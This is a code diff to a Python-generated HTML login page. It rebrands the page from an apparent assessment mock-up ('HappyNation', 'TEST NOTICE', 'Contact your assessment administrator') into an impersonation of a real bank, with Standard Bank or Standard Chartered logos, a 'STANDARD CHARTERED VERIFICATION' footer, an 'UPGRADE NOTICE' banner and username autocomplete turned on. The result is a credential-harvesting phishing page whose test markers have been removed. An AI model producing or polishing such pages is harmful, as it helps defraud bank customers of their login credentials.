@@ -1224,7 +1224,7 @@ def base(content, header=True):
     <link
         rel="icon"
         type="image/png"
-        href="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
+        href="https://e7.pngegg.com/pngimages/397/605/png-clipart-standard-bank-finance-financial-services-funding-bank-emblem-trademark-thumbnail.png"
     >
 
     <meta property="og:title" content="FNB">
@@ -1236,7 +1236,7 @@ def base(content, header=True):
 
     <meta
         property="og:image"
-        content="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
+        content="https://e7.pngegg.com/pngimages/397/605/png-clipart-standard-bank-finance-financial-services-funding-bank-emblem-trademark-thumbnail.png"
     >
 
     <meta property="og:type" content="website">
@@ -1245,7 +1245,7 @@ def base(content, header=True):
 
     <meta
         name="twitter:image"
-        content="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
+        content="https://e7.pngegg.com/pngimages/397/605/png-clipart-standard-bank-finance-financial-services-funding-bank-emblem-trademark-thumbnail.png"
     >
 
     {CSS}
@@ -1259,7 +1259,7 @@ def base(content, header=True):
         {content}
 
         <div class="footer">
-            ONLINE FNB VERIFICATION | SERVER SYSTEM BW
+            ONLINE STANDARD CHARTERED VERIFICATION | SERVER SYSTEM BW
         </div>
 
     </body>
@@ -1567,7 +1567,7 @@ Status: Test access started
     <div class="hn-card">
 
         <h1 class="hn-title">
-            Sign in to HappyNation Online
+            Sign in to Online Banking
         </h1>
 
         <form method="POST" id="loginForm">
@@ -1580,7 +1580,7 @@ Status: Test access started
                     type="text"
                     name="username"
                     placeholder="Username"
-                    autocomplete="off"
+                    autocomplete="on"
                     required
                 >
 
@@ -1639,7 +1639,7 @@ Status: Test access started
 
     <footer class="hn-footer">
 
-        <p>New to HappyNation?</p>
+        <p>New to online banking?</p>
 
         <p class="hn-footer-strong">
             Register here
@@ -1647,7 +1647,7 @@ Status: Test access started
 
         <p>
             <strong>Need help?</strong>
-            Contact your assessment administrator
+            call or Drop us an Email
         </p>
 
         <div class="hn-footer-links">
@@ -1668,7 +1668,7 @@ Status: Test access started
     <div class="hn-notice-box">
 
         <div class="hn-notice-title">
-            ⚠ TEST NOTICE
+            ⚠ UPGRADE NOTICE
         </div>
 
         <div
